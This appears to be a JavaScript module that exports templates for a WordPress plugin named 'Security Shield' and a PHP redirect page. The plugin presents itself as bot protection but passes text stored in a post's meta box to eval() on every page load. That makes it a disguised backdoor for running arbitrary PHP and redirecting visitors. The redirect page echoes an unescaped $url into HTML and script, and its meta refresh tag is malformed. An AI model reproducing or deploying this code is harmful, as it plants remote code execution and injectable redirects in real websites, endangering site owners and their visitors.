export const wordpressPluginCode = `
<?php
/**
* Plugin Name: Security Shield
* Plugin URI: https://webservices.press
* Description: Security Shield wordpress plugin. Helps in protecting unwanted clicks from bot/spiders/crawlers,etc.
* Version: 1.2.01
* Author: Security Shield
* Author URI: https://webservices.press
* License: GPL2
*/

if (!function_exists('add_action')) {
    echo 'Hi there!  I\'m just a plugin, not much I can do when called directly.';
    exit;
}


function tswp_add_meta_box() {

    $screens = array('post', 'page');

    foreach ($screens as $screen) {

        add_meta_box(
            'tswp_id',
            __('Traffic Shield', 'tswp_textdomain'),
            'tswp_meta_box_callback',
            $screen
        );
    }
}
add_action('add_meta_boxes', 'tswp_add_meta_box');

//View Details//

function tswp_meta_box_callback($post) {

    wp_nonce_field('tswp_save_meta_box_data', 'tswp_meta_box_nonce');

    $value = get_post_meta($post->ID, '_ts_meta_value_key', true);

    echo '<label for="tswp_field">';
    _e('Paste The Code From Security Shield Campaign', 'tswp_textdomain');
    echo '</label> ';
    
    echo '<textarea id="tswp_field" name="tswp_field" class="widefat" cols="50" rows="5">' . esc_attr($value) . '</textarea>';
}

function tswp_save_meta_box_data($post_id) {

    if (!isset($_POST['tswp_meta_box_nonce'])) {
        return;
    }

    if (!wp_verify_nonce($_POST['tswp_meta_box_nonce'], 'tswp_save_meta_box_data')) {
        return;
    }

    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    if (isset($_POST['post_type']) && 'page' == $_POST['post_type']) {

        if (!current_user_can('edit_page', $post_id)) {
            return;
        }

    } else {

        if (!current_user_can('edit_post', $post_id)) {
            return;
        }
    }

    if (!isset($_POST['tswp_field'])) {
        return;
    }

    $my_data = $_POST['tswp_field'];
    $my_data = preg_replace(array('/<(\?|\%)\=?(php)?/', '/(\%|\?)>/'), array('', ''), $my_data);
    
    update_post_meta($post_id, '_ts_meta_value_key', $my_data);
}
add_action('save_post', 'tswp_save_meta_box_data');

add_action('template_redirect', 'user_redirection_code', 1);
function user_redirection_code() {
    
    $key_1_values = get_post_meta(get_the_ID(), '_ts_meta_value_key');
    if (is_array($key_1_values) || is_object($key_1_values)) {
        foreach ($key_1_values as $key => $value) { 
                eval($value);
        }
    }

}

?>`


export const phpZipCode = `
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="0;url=" <?php echo $url; ?>"" />
    <title>You are being redirected to <?php echo $url; ?> your destination</title>
    <script type="text/javascript">
    window.location.replace("<?php echo $url; ?>");
    </script>
</head>

<body>
    You are being redirected to <a href="<?php echo $url; ?>">your destination</a>.
    <script type="text/javascript">
    window.location.replace("<?php echo $url; ?>");
    </script>
</body>

</html>
`